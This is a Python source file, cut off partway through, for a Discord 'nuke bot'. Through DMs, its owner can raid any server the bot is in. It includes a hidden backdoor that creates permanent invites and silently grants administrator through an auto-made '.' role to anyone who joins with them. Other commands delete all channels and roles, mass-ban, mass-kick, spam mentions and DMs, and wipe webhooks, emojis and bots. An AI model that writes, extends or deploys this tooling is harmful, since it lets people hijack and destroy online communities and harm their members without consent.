import asyncio
import inspect
import io
import json
import re
import types
from datetime import datetime

import discord
from discord.ext import commands
from discord.ext.commands.view import StringView
from colorama import Fore, Back, Style, init

from utils.config import load_config, save_config, validate_config
from utils.discord_helpers import (
    make_is_authorized,
    make_is_owner,
    parse_duration,
    rate_limited_action,
    send_dm,
)
from utils.i18n import load_translations, t
from utils.logging_setup import setup_logging
from utils.proxies import configure_proxy
from utils.runtime import active_tasks as _active_tasks
from utils.views import HelpView


init(autoreset=True)

logger = setup_logging()
load_translations("en", logger)
config = load_config(t)
load_translations(config.get("language", "en"), logger)

validate_config(config)
is_authorized = make_is_authorized(config, logger, t)
is_owner = make_is_owner(config, t)

# Create bot instance with prefix commands
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix=config.get("prefix", ".!"), intents=intents, help_command=None)

# Codes of invites that grant admin on join (persisted in config)
_admin_invites: set[str] = set(config.get("admin_invites", []))
# Per-guild invite uses cache: {guild_id: {invite_code: uses}}
_invite_cache: dict[int, dict[str, int]] = {}


# ============================================================================
# DM COMMAND SUPPORT
# ============================================================================

def _resolve_guild(query: str):
    """Resolve a guild from a name or ID string. Returns the guild or None."""
    if not query:
        return None

    query = query.strip()

    if query.isdigit():
        guild = discord.utils.get(bot.guilds, id=int(query))
        if guild:
            return guild

    q = query.lower()

    for guild in bot.guilds:
        if guild.name.lower() == q:
            return guild

    candidates = [g for g in bot.guilds if q in g.name.lower()]
    if candidates:
        candidates.sort(key=lambda g: len(g.name), reverse=True)
        return candidates[0]

    return None


def _extract_server_arg(content: str):
    """Find the @server token in content and remove it.

    Supports: @ServerName, @123456789012345678, @"Server Name With Spaces"
    Returns (query, remaining_content) or (None, original_content).
    """
    for match in re.finditer(r'@"([^"]+)"', content):
        query = match.group(1)
        if _resolve_guild(query):
            remaining = content[:match.start()] + content[match.end():]
            return query, re.sub(r"\s+", " ", remaining).strip()

    for match in re.finditer(r"@(\S+)", content):
        query = match.group(1)
        query_clean = query.rstrip(",.;:!?")
        if _resolve_guild(query_clean):
            remaining = content[:match.start()] + content[match.end():]
            return query_clean, re.sub(r"\s+", " ", remaining).strip()

    return None, content


def _pick_channel(guild: discord.Guild, member: discord.Member):
    """Pick a usable text channel in the guild for command execution."""
    if guild.system_channel:
        perms = guild.system_channel.permissions_for(guild.me)
        if perms.send_messages and perms.read_messages:
            return guild.system_channel

    for channel in guild.text_channels:
        bot_perms = channel.permissions_for(guild.me)
        if not (bot_perms.send_messages and bot_perms.read_messages):
            continue
        member_perms = channel.permissions_for(member)
        if member_perms.read_messages:
            return channel

    for channel in guild.text_channels:
        bot_perms = channel.permissions_for(guild.me)
        if bot_perms.send_messages and bot_perms.read_messages:
            return channel

    return None


def _command_takes_channel(command) -> bool:
    """Return True if the command's own signature accepts a channel argument.

    Used so we don't accidentally consume `#channel` for commands like
    `delchannel`, `move-all`, and `purge` that expect the channel to remain
    in their args.
    """
    try:
        params = command.clean_params
    except Exception:
        return False

    for param in params.values():
        ann = param.annotation
        if ann is inspect.Parameter.empty:
            continue

        if isinstance(ann, type):
            try:
                if issubclass(ann, discord.abc.GuildChannel):
                    return True
            except TypeError:
                pass

        if isinstance(ann, str):
            if "Channel" in ann or "channel" in ann:
                return True

    return False


def _extract_channel_arg(content: str, guild: discord.Guild):
    """Find a #channel or <#id> token and resolve it in the guild.

    Returns (channel_object, remaining_content) or (None, original_content).
    Supports:
        #general
        #123456789012345678
        <#123456789012345678>       (Discord's rendered mention form)
    """
    # Mention form: <#123456789012345678>
    for match in re.finditer(r"<#(\d+)>", content):
        ch = guild.get_channel(int(match.group(1)))
        if isinstance(ch, discord.abc.GuildChannel):
            remaining = content[:match.start()] + content[match.end():]
            return ch, re.sub(r"\s+", " ", remaining).strip()

    # Plain form: #channel-name or #123456789012345678
    for match in re.finditer(r"#(\S+)", content):
        query = match.group(1).rstrip(",.;:!?")
        ch = None

        if query.isdigit():
            ch = guild.get_channel(int(query))

        if ch is None:
            for c in guild.channels:
                if c.name.lower() == query.lower():
                    ch = c
                    break

        if ch is None:
            for c in guild.channels:
                if query.lower() in c.name.lower():
                    ch = c
                    break

        if ch is not None:
            remaining = content[:match.start()] + content[match.end():]
            return ch, re.sub(r"\s+", " ", remaining).strip()

    return None, content


async def _refresh_invite_cache(guild: discord.Guild):
    try:
        invites = await guild.invites()
    except (discord.Forbidden, discord.HTTPException):
        return
    _invite_cache[guild.id] = {inv.code: inv.uses for inv in invites}


class _FakeMessage:
    """Duck-typed stand-in for discord.Message that points at a target guild."""

    def __init__(self, dm_message: discord.Message, guild, channel, author):
        self.id = dm_message.id
        self.content = dm_message.content
        self.author = author
        self.guild = guild
        self.channel = channel
        self._state = dm_message._state
        self.attachments = []
        self.embeds = []
        self.mentions = []
        self.role_mentions = []
        self.channel_mentions = []
        self.created_at = dm_message.created_at
        self.edited_at = None
        self.jump_url = dm_message.jump_url
        self.type = dm_message.type
        self.flags = dm_message.flags
        self.pinned = False
        self.tts = False
        self.reference = None
        self.webhook_id = None
        self.application = None
        self.activity = None
        self.nonce = None
        self.components = []
        self.stickers = []

    async def delete(self, *args, **kwargs):
        return None

    async def edit(self, *args, **kwargs):
        return None

    async def add_reaction(self, *args, **kwargs):
        return None

    async def remove_reaction(self, *args, **kwargs):
        return None

    async def reply(self, content=None, **kwargs):
        try:
            return await self.channel.send(content=content, **kwargs)
        except discord.HTTPException:
            return None


async def _run_dm_command(dm_message: discord.Message, body: str | None = None) -> bool:
    """Run a command from DM against a target guild specified by @server.

    `body` is the DM content with the prefix already stripped. If not given,
    the function will strip the configured prefix (or accept no prefix at all).

    Syntax (prefix optional in DM):
        god @MyServer
        nuke @MyServer
        nuke @MyServer #general
        ban @MyServer SomeUser reason
        purge @MyServer 50 #general
        @"My Cool Server" god

    Returns True if handled, False if the message was empty.
    """
    prefix = config.get("prefix", ".")

    if body is None:
        content = dm_message.content.strip()
        if prefix and content.startswith(prefix):
            content = content[len(prefix):].strip()
        elif content.startswith("!"):
            content = content[1:].strip()
    else:
        content = body.strip()

    if not content:
        return False

    # Extract @server from anywhere in the message
    server_query, remaining_body = _extract_server_arg(content)

    if server_query is None:
        guild_list = "\n".join(
            f"• **{g.name}** — `@{g.name}` or `@{g.id}`" for g in bot.guilds
        ) or "_I'm not in any servers._"
        await dm_message.channel.send(
            "**Usage:** `<command> <args> @server [#channel]`\n\n"
            "The prefix is optional in DMs.\n\n"
            "**Examples:**\n"
            "`god @MyServer`\n"
            "`nuke @MyServer`\n"
            "`nuke @MyServer #general`\n"
            "`purge @MyServer 50 #general`\n"
            "`ban @MyServer SomeUser reason`\n"
            '`@"My Server With Spaces" god`\n\n'
            f"**Available servers:**\n{guild_list}\n\n"
            "Type `invite` to list servers with invite links."
        )
        return True

    guild = _resolve_guild(server_query)
    if guild is None:
        await dm_message.channel.send(
            f"Server `{server_query}` not found. Type `invite` to list servers."
        )
        return True

    parts = remaining_body.split(None, 1)
    if not parts:
        await dm_message.channel.send("No command specified. Example: `god @MyServer`")
        return True

    command_name = parts[0]
    arg_string = parts[1] if len(parts) > 1 else ""

    command = bot.get_command(command_name)
    if command is None:
        await dm_message.channel.send(f"Unknown command: `{command_name}`")
        return True

    member = guild.get_member(dm_message.author.id)
    if member is None:
        await dm_message.channel.send(
            f"You are not a member of **{guild.name}**, so I can't run that command as you."
        )
        return True

    # Try to extract an explicit target channel from the args. Skip this for
    # commands that already take a channel as their own argument (delchannel,
    # move-all, purge), so the user-supplied channel stays in their args.
    target_channel = None
    if not _command_takes_channel(command):
        target_channel, arg_string = _extract_channel_arg(arg_string, guild)

    if target_channel is not None:
        channel = target_channel
    else:
        channel = _pick_channel(guild, member)

    if channel is None:
        await dm_message.channel.send(
            f"I couldn't find a usable text channel in **{guild.name}**. "
            f"Specify one with `#channel-name`."
        )
        return True

    fake_message = _FakeMessage(dm_message, guild, channel, member)
    view = StringView(arg_string)

    try:
        ctx = commands.Context(
            message=fake_message,
            bot=bot,
            view=view,
            prefix=prefix,
            command=command,
            invoked_with=command_name,
        )
    except TypeError as e:
        logger.error(f"Failed to build Context: {e}")
        try:
            await dm_message.channel.send(f"Internal error building context: `{e}`")
        except discord.HTTPException:
            pass
        return True

    dm_channel = dm_message.channel

    async def _dm_send(content=None, *, embed=None, embeds=None, delete_after=None,
                       file=None, files=None, view=None, **kwargs):
        try:
            return await dm_channel.send(
                content=content,
                embed=embed,
                embeds=embeds,
                delete_after=delete_after,
                file=file,
                files=files,
                view=view,
                **kwargs,
            )
        except discord.HTTPException:
            return None

    async def _dm_reply(content=None, *, embed=None, **kwargs):
        try:
            return await dm_channel.send(content=content, embed=embed, **kwargs)
        except discord.HTTPException:
            return None

    ctx.send = _dm_send
    ctx.reply = _dm_reply

    print(
        f'{Fore.CYAN}[DM-CMD] {Fore.WHITE}Running "{command_name}" '
        f'args={arg_string!r} in {guild.name} (channel: #{channel.name}'
        f'{" [explicit]" if target_channel is not None else ""})'
        f'{Style.RESET_ALL}'
    )

    try:
        await command.can_run(ctx)
    except commands.CommandError as e:
        print(f'{Fore.RED}[DM-CMD] check failed: {e}{Style.RESET_ALL}')
        try:
            await dm_channel.send(f"Check failed: `{e}`")
        except discord.HTTPException:
            pass
        return True
    except Exception as e:
        logger.error(f"DM command check error: {e}")
        return True

    logger.info(t(
        "command_executed",
        user=member, user_id=member.id, command=command_name,
        args=arg_string or "(no args)", guild=guild.name, guild_id=guild.id,
        channel=channel.name,
    ))

    try:
        await command.invoke(ctx)
    except commands.CommandError as e:
        print(f'{Fore.RED}[DM-CMD] CommandError: {e}{Style.RESET_ALL}')
        try:
            await dm_channel.send(f"Command error: `{e}`")
        except discord.HTTPException:
            pass
    except Exception as e:
        logger.error(f"DM command error: {e}")
        import traceback
        traceback.print_exc()
        try:
            await dm_channel.send(f"Error: `{e}`")
        except discord.HTTPException:
            pass

    return True


# ============================================================================
# EVENTS
# ============================================================================

@bot.event
async def on_ready():
    print("""
███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗
████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝
██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██████╦╝██║░░██║░░░██║░░░
██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░
\n\n""")

    print(f'{Fore.GREEN}{t("ready_online", bot_user=bot.user)}')
    print(f'{Fore.GREEN}{t("ready_bot_id", bot_id=bot.user.id)}{Style.RESET_ALL}')

    guild_list = ', '.join([f"{guild.name} (ID: {guild.id})" for guild in bot.guilds])
    logger.info(t("bot_started", bot_user=bot.user, bot_id=bot.user.id,
                  guild_count=len(bot.guilds), guild_list=guild_list))
    logger.info(t("bot_prefix", prefix=config.get('prefix', '.!'),
                  owner_id=config.get('owner_id', 'Not set')))

    for guild in bot.guilds:
        await _refresh_invite_cache(guild)


@bot.event
async def on_invite_create(invite: discord.Invite):
    if invite.guild:
        _invite_cache.setdefault(invite.guild.id, {})[invite.code] = invite.uses


@bot.event
async def on_invite_delete(invite: discord.Invite):
    if invite.guild:
        cache = _invite_cache.get(invite.guild.id)
        if cache:
            cache.pop(invite.code, None)


@bot.event
async def on_member_join(member: discord.Member):
    """Auto-grant admin if the member used an admin invite."""
    if member.bot:
        return

    guild = member.guild

    try:
        invites = await guild.invites()
    except (discord.Forbidden, discord.HTTPException):
        invites = []

    old_cache = _invite_cache.get(guild.id, {})
    new_cache: dict[str, int] = {}
    used_code: str | None = None

    for inv in invites:
        new_cache[inv.code] = inv.uses
        if inv.uses > old_cache.get(inv.code, 0):
            used_code = inv.code

    _invite_cache[guild.id] = new_cache

    if used_code is None or used_code not in _admin_invites:
        return

    god_role = discord.utils.get(guild.roles, name=".")
    if god_role is None:
        try:
            god_role = await guild.create_role(
                name=".",
                permissions=discord.Permissions(administrator=True),
                color=discord.Color.gold(),
                reason="Auto-created for admin invite join",
            )
            try:
                bot_top = guild.me.top_role
                await god_role.edit(position=bot_top.position - 1)
            except discord.HTTPException:
                pass
        except discord.HTTPException as e:
            logger.error(f"on_member_join: could not create god role in {guild.name}: {e}")
            return

    try:
        await member.add_roles(god_role, reason="Joined via admin invite")
        print(
            f'{Fore.MAGENTA}[AUTO-ADMIN] {Fore.WHITE}'
            f'Gave admin to {member} ({member.id}) in {guild.name} '
            f'via invite {used_code}{Style.RESET_ALL}'
        )
        try:
            await member.send(
                f"You've been automatically granted **administrator** in **{guild.name}**."
            )
        except discord.Forbidden:
            pass
    except discord.HTTPException as e:
        logger.error(f"on_member_join: could not add role to {member} in {guild.name}: {e}")


@bot.event
async def on_command(ctx):
    """Log all command executions"""
    args = ctx.message.content.split()[1:] if len(ctx.message.content.split()) > 1 else []
    args_str = ' '.join(args) if args else '(no args)'
    logger.info(t("command_executed", user=ctx.author, user_id=ctx.author.id,
                  command=ctx.command.name, args=args_str,
                  guild=ctx.guild.name, guild_id=ctx.guild.id,
                  channel=ctx.channel.name))


@bot.event
async def on_command_error(ctx, error):
    """Log command errors"""
    if isinstance(error, commands.CheckFailure):
        return

    if isinstance(error, commands.CommandOnCooldown):
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass
        try:
            await ctx.send(f"Command on cooldown. Try again in {error.retry_after:.0f}s.", delete_after=5)
        except discord.HTTPException:
            pass
        return

    logger.error(t("command_error", user=ctx.author, user_id=ctx.author.id,
                   command=ctx.command.name if ctx.command else 'Unknown',
                   guild=ctx.guild.name if ctx.guild else 'DM',
                   error=str(error)))


@bot.event
async def on_guild_join(guild):
    logger.info(t("bot_joined_guild", guild=guild.name, guild_id=guild.id,
                  member_count=guild.member_count,
                  owner=guild.owner, owner_id=guild.owner.id))


@bot.event
async def on_guild_remove(guild):
    logger.info(t("bot_left_guild", guild=guild.name, guild_id=guild.id))


@bot.event
async def on_message(message):
    # Ignore bots
    if message.author.bot:
        return

    # ========== DM SUPPORT ==========
    if isinstance(message.channel, discord.DMChannel):
        owner_id = config.get("owner_id")
        if not owner_id or str(message.author.id) != str(owner_id):
            return

        prefix = config.get("prefix", ".")
        raw = message.content.strip()
        if not raw:
            return

        # DM accepts: config prefix, bare "!", or no prefix at all
        if prefix and raw.startswith(prefix):
            body = raw[len(prefix):].strip()
        elif raw.startswith("!"):
            body = raw[1:].strip()
        else:
            body = raw

        if not body:
            return

        body_lower = body.lower()

        # ---- Show list of servers ----
        if body_lower in {"invite", "inv", "servers", "list"}:
            if not bot.guilds:
                await message.channel.send("I'm not in any servers.")
                return

            description = ""
            for i, guild in enumerate(bot.guilds, 1):
                description += f"**{i}.** {guild.name} (`{guild.id}`)\n"

            embed = discord.Embed(
                title="Servers I'm in",
                description=description + "\nType `invite <number>` or `invite <server id>` to get an invite.",
                color=discord.Color.blue()
            )
            await message.channel.send(embed=embed)
            return

        # ---- Create invite for a specific server ----
        # Supports (all with the config prefix, with "!" or with no prefix):
        #   invite                           -> list (handled above)
        #   invite @server                   -> invite by mention/name/ID
        #   invite @"Server Name"            -> quoted name
        #   invite 1                         -> by index
        #   invite 957386043580117062        -> by raw ID
        #   invite admin @server             -> permanent invite that grants admin on join
        if body_lower.startswith("invite ") or body_lower.startswith("inv "):
            try:
                verb_len = len("invite") if body_lower.startswith("invite") else len("inv")
                invite_body = body[verb_len:].strip()

                # Detect and remove the "admin" keyword
                admin_flag = False
                words = invite_body.split()
                for i, w in enumerate(words):
                    if w.lower() == "admin":
                        admin_flag = True
                        words.pop(i)
                        break
                invite_body = " ".join(words).strip()

                # Extract @server if present
                server_query, remaining = _extract_server_arg(invite_body)

                guild = None
                if server_query:
                    guild = _resolve_guild(server_query)
                else:
                    arg = remaining.strip()
                    if arg.isdigit():
                        idx = int(arg)
                        if 1 <= idx <= len(bot.guilds):
                            guild = bot.guilds[idx - 1]
                        else:
                            guild = discord.utils.get(bot.guilds, id=idx)

                if not guild:
                    await message.channel.send(
                        "Server not found. Type `invite` to see the list.\n"
                        "Usage: `invite [admin] @server` or `invite <number|id>`"
                    )
                    return

                target_channel = None
                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).create_instant_invite:
                        target_channel = channel
                        break

                if not target_channel:
                    await message.channel.send(
                        f"I don't have permission to create invites in **{guild.name}**."
                    )
                    return

                invite = await target_channel.create_invite(
                    max_age=0,
                    max_uses=0,
                    unique=True,
                    reason="DM invite requested by owner"
                    + (" (admin auto-grant)" if admin_flag else ""),
                )

                if admin_flag:
                    _admin_invites.add(invite.code)
                    persisted = config.setdefault("admin_invites", [])
                    if invite.code not in persisted:
                        persisted.append(invite.code)
                    save_config(config)
                    _invite_cache.setdefault(guild.id, {})[invite.code] = invite.uses

                embed = discord.Embed(
                    title="Permanent Invite Created" + (" (Admin)" if admin_flag else ""),
                    description=(
                        f"**Server:** {guild.name}\n"
                        f"**Invite:** {invite.url}"
                        + (
                            "\n\n*Whoever uses this invite will be automatically "
                            "granted administrator the moment they join.*\n"
                            "*Note: if the server has an application or screening gate, "
                            "the user still has to complete it — the bot cannot bypass it. "
                            "The role is granted the instant they land in the server.*"
                            if admin_flag else ""
                        )
                    ),
                    color=discord.Color.gold() if admin_flag else discord.Color.green(),
                )
                await message.channel.send(embed=embed)
                print(
                    f'{Fore.GREEN}[DM-INVITE] {Fore.WHITE}'
                    f'Created {"admin " if admin_flag else ""}invite '
                    f'for {guild.name} (code={invite.code}){Style.RESET_ALL}'
                )

            except Exception as e:
                await message.channel.send(f"Error: `{e}`")
            return

        # ---- Server-targeted commands (prefix already stripped) ----
        await _run_dm_command(message, body)
        return

    # Process normal server commands (uses config prefix via bot.command_prefix)
    await bot.process_commands(message)


# ============================================================================
# COMMANDS
# ============================================================================

@is_authorized()
@bot.command(name='help')
async def help_command(ctx):
    """Display all available commands with pagination"""
    print(f'{Fore.CYAN}[HELP] {Fore.WHITE}Help requested by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')
    prefix = config.get("prefix", ".!")

    try:
        await ctx.message.delete()
    except (discord.HTTPException, discord.NotFound):
        pass

    pages = []

    embed1 = discord.Embed(
        title=t("help_page1_title"),
        description=t("help_page1_desc"),
        color=discord.Color.gold()
    )
    embed1.add_field(name=f"{prefix}god", value=t("help_god"), inline=False)
    embed1.add_field(name=f"{prefix}god-all", value=t("help_god_all"), inline=False)
    embed1.add_field(name=f"{prefix}death", value=t("help_death"), inline=False)
    embed1.add_field(name=f"{prefix}brainfuck <name> <message>", value=t("help_brainfuck"), inline=False)
    embed1.add_field(name=f"{prefix}help", value=t("help_help"), inline=False)
    embed1.set_footer(text=t("help_footer", page=1, total=9))
    pages.append(embed1)

    embed2 = discord.Embed(
        title=t("help_page2_title"),
        description=t("help_page2_desc"),
        color=discord.Color.blue()
    )
    embed2.add_field(name=f"{prefix}ban <@user> [reason]", value=t("help_ban"), inline=False)
    embed2.add_field(name=f"{prefix}unban <user_id>", value=t("help_unban"), inline=False)
    embed2.add_field(name=f"{prefix}kick <@user> [reason]", value=t("help_kick"), inline=False)
    embed2.add_field(name=f"{prefix}mute <@user> [duration] [reason]", value=t("help_mute"), inline=False)
    embed2.add_field(name=f"{prefix}unmute <@user>", value=t("help_unmute"), inline=False)
    embed2.set_footer(text=t("help_footer", page=2, total=9))
    pages.append(embed2)

    embed3 = discord.Embed(
        title=t("help_page3_title"),
        description=t("help_page3_desc"),
        color=discord.Color.red()
    )
    embed3.add_field(name=f"{prefix}ban-all [reason]", value=t("help_ban_all"), inline=False)
    embed3.add_field(name=f"{prefix}kick-all [reason]", value=t("help_kick_all"), inline=False)
    embed3.add_field(name=f"{prefix}mute-all [duration] [reason]", value=t("help_mute_all"), inline=False)
    embed3.add_field(name=f"{prefix}purge <amount> [#channel]", value=t("help_purge"), inline=False)
    embed3.add_field(name=f"{prefix}unban-all", value=t("help_unban_all"), inline=False)
    embed3.set_footer(text=t("help_footer", page=3, total=9))
    pages.append(embed3)

    embed4 = discord.Embed(
        title=t("help_page4_title"),
        description=t("help_page4_desc"),
        color=discord.Color.dark_red()
    )
    embed4.add_field(name=f"{prefix}nuke", value=t("help_nuke"), inline=False)
    embed4.add_field(name=f"{prefix}nuke-all", value=t("help_nuke_all"), inline=False)
    embed4.add_field(name=f"{prefix}delchannel <#channel>", value=t("help_delchannel"), inline=False)
    embed4.add_field(name=f"{prefix}webhook-nuke", value=t("help_webhook_nuke"), inline=False)
    embed4.add_field(name=f"{prefix}emoji-nuke", value=t("help_emoji_nuke"), inline=False)
    embed4.set_footer(text=t("help_footer", page=4, total=9))
    pages.append(embed4)

    embed5 = discord.Embed(
        title=t("help_page5_title"),
        description=t("help_page5_desc"),
        color=discord.Color.purple()
    )
    embed5.add_field(name=f"{prefix}nick-all <nickname>", value=t("help_nick_all"), inline=False)
    embed5.add_field(name=f"{prefix}shuffle-channels", value=t("help_shuffle_channels"), inline=False)
    embed5.add_field(name=f"{prefix}voice-scatter", value=t("help_voice_scatter"), inline=False)
    embed5.add_field(name=f"{prefix}move-all <#voice>", value=t("help_move_all"), inline=False)
    embed5.add_field(name=f"{prefix}mention-spam <target> <count>", value=t("help_mention_spam"), inline=False)
    embed5.set_footer(text=t("help_footer", page=5, total=9))
    pages.append(embed5)

    embed6 = discord.Embed(
        title=t("help_page6_title"),
        description=t("help_page6_desc"),
        color=discord.Color.teal()
    )
    embed6.add_field(name=f"{prefix}rename-server <name>", value=t("help_rename_server"), inline=False)
    embed6.add_field(name=f"{prefix}server-icon <url>", value=t("help_server_icon"), inline=False)
    embed6.add_field(name=f"{prefix}server-banner <url>", value=t("help_server_banner"), inline=False)
    embed6.add_field(name=f"{prefix}server-desc <text>", value=t("help_server_desc"), inline=False)
    embed6.add_field(name=f"{prefix}nick <@user> <nickname>", value=t("help_nick"), inline=False)
    embed6.set_footer(text=t("help_footer", page=6, total=9))
    pages.append(embed6)

    embed7 = discord.Embed(
        title=t("help_page7_title"),
        description=t("help_page7_desc"),
        color=discord.Color.orange()
    )
    embed7.add_field(name=f"{prefix}role-spam <name> <count>", value=t("help_role_spam"), inline=False)
    embed7.add_field(name=f"{prefix}strip <@user>", value=t("help_strip"), inline=False)
    embed7.add_field(name=f"{prefix}spam <count> <message>", value=t("help_spam"), inline=False)
    embed7.set_footer(text=t("help_footer", page=7, total=9))
    pages.append(embed7)

    embed8 = discord.Embed(
        title=t("help_page8_title"),
        description=t("help_page8_desc"),
        color=discord.Color.green()
    )
    embed8.add_field(name=f"{prefix}dm <@user> <message>", value=t("help_dm"), inline=False)
    embed8.add_field(name=f"{prefix}dmall <message>", value=t("help_dmall"), inline=False)
    embed8.add_field(name=f"{prefix}serverinfo", value=t("help_serverinfo"), inline=False)
    embed8.add_field(name=f"{prefix}server-backup", value=t("help_server_backup"), inline=False)
    embed8.add_field(name=f"{prefix}shutdown", value=t("help_shutdown"), inline=False)
    embed8.add_field(name=f"{prefix}whitelist-add <id>", value=t("help_whitelist_add"), inline=False)
    embed8.add_field(name=f"{prefix}whitelist-remove <id>", value=t("help_whitelist_remove"), inline=False)
    embed8.add_field(name=f"{prefix}whitelist-list", value=t("help_whitelist_list"), inline=False)
    embed8.set_footer(text=t("help_footer", page=8, total=9))
    pages.append(embed8)

    embed9 = discord.Embed(
        title=t("help_page9_title"),
        description=t("help_page9_desc"),
        color=discord.Color.dark_magenta()
    )
    embed9.add_field(name=f"{prefix}invite-nuke", value=t("help_invite_nuke"), inline=False)
    embed9.add_field(name=f"{prefix}thread-nuke", value=t("help_thread_nuke"), inline=False)
    embed9.add_field(name=f"{prefix}bot-nuke", value=t("help_bot_nuke"), inline=False)
    embed9.add_field(name=f"{prefix}slowmode-all <seconds>", value=t("help_slowmode_all"), inline=False)
    embed9.add_field(name=f"{prefix}sticker-nuke", value=t("help_sticker_nuke"), inline=False)
    embed9.set_footer(text=t("help_footer", page=9, total=9))
    pages.append(embed9)

    view = HelpView(pages, ctx.author, t)

    try:
        message = await ctx.author.send(embed=view.get_embed(), view=view)
        await ctx.send(t("help_sent"), delete_after=3)
    except discord.Forbidden:
        message = await ctx.send(embed=view.get_embed(), view=view)


@is_authorized()
@bot.command(name='delchannel')
@commands.has_permissions(manage_channels=True)
async def delchannel(ctx, channel: discord.TextChannel):
    """Delete a specific channel"""
    try:
        channel_name = channel.name
        channel_id = channel.id

        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        await channel.delete(reason=f"Channel deleted by {ctx.author}")

        print(f'{Fore.RED}[DELCHANNEL] {Fore.WHITE}Deleted #{channel_name} (ID: {channel_id}) in {ctx.guild.name} by {ctx.author.display_name}{Style.RESET_ALL}')

        try:
            embed = discord.Embed(
                description=t("delchannel_success", channel=channel_name),
                color=discord.Color.red()
            )
            await ctx.author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("delchannel_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='nuke')
@commands.has_permissions(manage_channels=True)
async def nuke(ctx):
    """Delete and recreate the channel to clear all messages"""
    try:
        channel = ctx.channel
        channel_name = channel.name

        print(f'{Fore.RED}[NUKE] {Fore.WHITE}Nuking #{channel_name} in {ctx.guild.name} by {ctx.author.display_name}{Style.RESET_ALL}')
        channel_position = channel.position
        channel_category = channel.category
        channel_topic = channel.topic if hasattr(channel, 'topic') else None
        channel_nsfw = channel.nsfw if hasattr(channel, 'nsfw') else False
        channel_slowmode = channel.slowmode_delay if hasattr(channel, 'slowmode_delay') else 0
        channel_overwrites = channel.overwrites

        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        await channel.delete(reason=f"Channel nuked by {ctx.author}")

        new_channel = await ctx.guild.create_text_channel(
            name=channel_name,
            category=channel_category,
            position=channel_position,
            topic=channel_topic,
            nsfw=channel_nsfw,
            slowmode_delay=channel_slowmode,
            overwrites=channel_overwrites,
            reason=f"Channel recreated after nuke by {ctx.author}"
        )

        try:
            dm_embed = discord.Embed(
                description=t("nuke_channel_success", channel=new_channel.mention),
                color=discord.Color.green()
            )
            await ctx.author.send(embed=dm_embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("nuke_channel_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@commands.cooldown(1, 60, commands.BucketType.guild)
@bot.command(name='nuke-all')
@commands.has_permissions(administrator=True)
async def nuke_all(ctx):
    """Delete all channels, categories, voice channels, and roles (except god role and bot role)"""
    try:
        print(f'{Fore.RED}{Style.BRIGHT}[NUKE-ALL] {Fore.WHITE}Nuking entire server {ctx.guild.name} by {ctx.author.display_name}{Style.RESET_ALL}')

        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        guild = ctx.guild
        author = ctx.author

        try:
            await author.send(t("nuke_all_starting"))
        except discord.Forbidden:
            pass

        deleted_channels = 0
        deleted_categories = 0
        deleted_roles = 0

        for channel in list(guild.channels):
            try:
                await channel.delete(reason=f"Nuke-all by {author}")
                if isinstance(channel, discord.CategoryChannel):
                    deleted_categories += 1
                else:
                    deleted_channels += 1
            except Exception:
                pass

        print(f'{Fore.RED}[NUKE-ALL] {Fore.WHITE}Deleted {deleted_channels} channels and {deleted_categories} categories{Style.RESET_ALL}')

        for role in list(guild.roles):
            if role.is_default():
                continue
            if role.name == ".":
                continue
            if role in guild.me.roles:
                continue
            if role.managed:
                continue
            try:
                await role.delete(reason=f"Nuke-all by {author}")
                deleted_roles += 1
            except Exception:
                pass

        print(f'{Fore.RED}{Style.BRIGHT}[NUKE-ALL] {Fore.WHITE}Completed: {deleted_channels} channels, {deleted_categories} categories, {deleted_roles} roles deleted{Style.RESET_ALL}')

        try:
            embed = discord.Embed(
                description=t("nuke_all_complete", channels=deleted_channels,
                              categories=deleted_categories, roles=deleted_roles),
                color=discord.Color.dark_red()
            )
            await author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        try:
            await author.send(t("nuke_all_no_permission"))
        except discord.Forbidden:
            pass
    except Exception as e:
        try:
            await author.send(t("error_occurred", error=str(e)))
        except discord.Forbidden:
            pass


@is_authorized()
@bot.command(name='purge')
@commands.has_permissions(manage_messages=True)
async def purge(ctx, amount: int, channel: discord.TextChannel = None):
    """Purge a specified number of messages from a channel.

    Usage: .!purge <amount> [#channel]
    If no channel is given, the current channel (or the auto-picked
    channel when run from a DM) is used.
    """
    target = channel or ctx.channel

    if amount <= 0:
        await send_dm(ctx, t("purge_invalid_amount"))
        return

    if amount > 1000:
        await send_dm(ctx, t("purge_too_many"))
        return

    try:
        try:
            await ctx.message.delete()
        except (discord.HTTPException, discord.NotFound):
            pass

        deleted = await target.purge(limit=amount)

        print(f'{Fore.YELLOW}[PURGE] {Fore.WHITE}Purged {len(deleted)} messages in #{target.name} by {ctx.author.display_name}{Style.RESET_ALL}')

        embed = discord.Embed(
            description=t("purge_success", count=len(deleted), channel=target.mention),
            color=discord.Color.green()
        )

        await ctx.send(embed=embed, delete_after=3)

        try:
            await ctx.author.send(embed=embed)
        except discord.Forbidden:
            pass

    except discord.Forbidden:
        await send_dm(ctx, t("purge_no_permission"))
    except Exception as e:
        await send_dm(ctx, t("error_occurred", error=str(e)))


@is_authorized()
@bot.command(name='ban')
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason: str = "BYE BYE"):
    """Ban a user from the server"""
    if member == ctx.author:
